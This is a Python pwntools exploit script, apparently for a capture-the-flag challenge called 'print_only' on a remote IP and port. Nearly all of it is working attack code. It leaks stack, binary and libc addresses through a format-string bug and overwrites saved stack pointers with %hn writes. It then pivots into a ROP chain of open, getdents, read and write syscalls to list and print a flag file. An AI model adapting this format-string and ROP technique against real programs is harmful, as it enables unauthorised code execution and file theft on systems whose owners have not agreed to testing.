#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.172 --port 60903 ./print_only
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./print_only_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
# host = args.HOST or '103.152.242.172'
# port = int(args.PORT or 60903)

host = args.HOST or '103.152.242.172'
port = int(args.PORT or 40904)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=False,gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x555555555310
# b *0x555555555357
b *0x55555555536d
continue
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def send(p):
    io.send(p)

libc = exe.libc

def syscall(rax, rdi, rsi, rdx):
    chain = p64(pop_rax) + p64(rax)
    chain += p64(pop_rdi) + p64(rdi)
    chain += p64(pop_rsi) + p64(rsi)
    chain += p64(pop_rdx) + p64(rdx) + p64(0xdeadbeef)
    chain += p64(syscall_ret)
    return chain

p='%p-%73$p-%75$p'
send(p)
leak = (io.recv(4200)).split('-')
print (leak)
stack = int(leak[0],16)
base_exe = int(leak[1],16)- 0x138a


libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234 - 9



pop_rax = libc.search(asm('pop rax ; ret')).next()
pop_rdi = libc.search(asm('pop rdi ; ret')).next()
pop_rsi = libc.search(asm('pop rsi ; ret')).next()
pop_rdx = libc.search(asm('pop rdx ; pop r12 ; ret')).next()
syscall_ret = libc.search(asm('syscall ; ret')).next()

pop_rbp = libc.search(asm("pop rbp ; ret")).next()
pop_rdx = libc.search(asm("pop rdx ; pop r12 ; ret")).next()
pop_esp = libc.search(asm('pop rsp ; ret')).next()

leave= base_exe + 0x136c

bss = base_exe + 0x4000
stack_rbp = stack + 0x210

fopen = libc.sym["fopen"]
open = libc.sym["open"]
read = libc.sym['read']
puts = libc.sym['puts']
write = libc.sym['write']
printf = libc.sym['printf']
gets = libc.sym['gets']

pop_r8 = libc.address + 0x000000000012a8b6

print hex(base_exe)
print hex(libc.address)

len_format = 0xffff

sys = stack - 8 + 8*6 # + 24
offset = []

for i in range(1):
   tmp = sys & len_format
   offset.append(tmp)
   sys >>= len_format.bit_length() # bit

sys = base_exe + 0x136c

for i in range(1):
   tmp = sys & len_format
   offset.append(tmp)
   sys >>= len_format.bit_length()

p = '%{}x%10$hn'.format(offset[0])
p += '%{}x%11$hn'.format(offset[1] - offset[0] + len_format + 1)
p = p.ljust(32, '\x00')
p += p64(stack_rbp) # tujuan
p += p64(stack_rbp+8) # tujuan

p += syscall(0, 0, bss+0x100, 320)
p += p64(pop_rbp)
p += p64(bss+0x100+8+24)
p += p64(leave)

print (len (p))
assert len(p) <= 0x128 # 298
send(p)
io.recvuntil("128")

#
if args.LOCAL:
    p = './flag.txt'
    p = '/'
    p = p.ljust(40,"\x00")
    p += syscall(2, bss+0x100, 0, 0)
    p += syscall(78, 3, bss+0x300, 0x200)
    # p += syscall(0, 3, bss+0x300, 0x200)
    p += syscall(1, 1, bss+0x300, 0x200)
else:
    p = '/app/flag_Itsxu6lsHixM4Yvl.txt'
    p = './flag_Itsxu6lsHixM4Yvl.txt'
    # p = './'
    p = p.ljust(40,"\x00")
    p += syscall(2, bss+0x100, 0, 0)
    # p += syscall(78, 5, bss+0x300, 0x220)
    # p += syscall(78, 5, bss+0x300, 0x48)
    p += syscall(0, 5, bss+0x300, 0x200)
    p += syscall(1, 1, bss+0x300, 0x48)

p = p.ljust(320,"\x00")
print leak
io.send(p)

# leak = io.recv()
# # # leak = unhex(leak)
# # print leak
# #
# leak = dirents(leak)
# #
# for i in leak:
#     print i
# print leak

io.interactive()
